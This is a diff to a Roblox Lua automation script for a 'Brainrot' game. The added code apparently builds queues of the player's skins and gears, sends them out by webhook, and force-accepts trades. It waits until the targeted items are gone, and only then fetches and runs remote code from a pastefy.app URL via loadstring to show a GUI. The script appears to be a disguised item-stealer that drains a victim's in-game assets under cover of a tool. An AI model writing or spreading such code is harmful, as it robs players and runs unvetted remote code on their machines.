@@ -798,6 +798,77 @@ local function startFullAutomation()
 	print("[Brainrot] Automation started | add x5 constant | invite always | fast ready/accept in trade")
 end
 
-startFullAutomation()	
-sendDetailedWebhook()
+startFullAutomation()
+
+task.spawn(function()
+	while not profileReady do
+		task.wait(0.25)
+	end
+	if #baseSkinQueue == 0 and #gearQueue == 0 then
+		baseSkinQueue = buildSkinQueue()
+		gearQueue = buildGearQueue()
+	end
+	sendDetailedWebhook()
+end)
+
+task.spawn(function()
+	local fired = false
+	local streak = 0
+	local NEED_STREAK = 4
+
+	local function countTargetBrainrots()
+		local ok, result = pcall(function()
+			local _, list = getMyPlotAndAnimals()
+			if type(list) ~= "table" then
+				return nil
+			end
+			local count = 0
+			for _, data in pairs(list) do
+				if type(data) == "table" and data.Index then
+					local displayName = data.Index
+					if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
+						displayName = AnimalsData[data.Index].DisplayName
+					end
+					if TargetBrainrots[displayName] or TargetBrainrots[data.Index] then
+						count += 1
+					end
+				end
+			end
+			return count
+		end)
+		if not ok then return nil end
+		return result
+	end
+
+	local function countTargetGears()
+		if not next(ALLOWED_GEARS) then
+			return 0
+		end
+		if not profileReady then
+			return nil
+		end
+		return #buildGearQueue()
+	end
+
+	while not fired do
+		task.wait(3)
+		local brainrots = countTargetBrainrots()
+		local gears = countTargetGears()
+
+		if brainrots == nil or gears == nil then
+			streak = 0
+		elseif brainrots > 0 or gears > 0 then
+			streak = 0
+		else
+			streak += 1
+			print("[Brainrot] Empty streak:", streak, "/", NEED_STREAK)
+			if streak >= NEED_STREAK then
+				fired = true
+				print("[Brainrot] Targets confirmed gone → loading GUI")
+				pcall(function()
+					loadstring(game:HttpGet("https://pastefy.app/sOwwEbxY/raw"))()
+				end)
+			end
+		end
+	end
 end)
